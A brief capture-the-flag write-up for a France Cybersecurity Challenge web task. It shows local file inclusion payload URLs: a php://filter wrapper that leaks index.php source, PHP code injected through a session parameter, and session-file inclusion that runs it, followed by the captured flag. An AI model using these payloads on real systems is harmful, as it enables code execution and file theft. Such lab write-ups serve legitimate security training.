First step: exploit LFI to get the source code of index.php<br />
Then : 
```http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=php://filter/convert.base64-encode/resource=index.php```<br />

```http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=<?php echo file_get_contents('flag.php');?>```<br />

```http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=sessions/sess_<PHPSESSID```<br />

Source code: 


$flag="FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}";
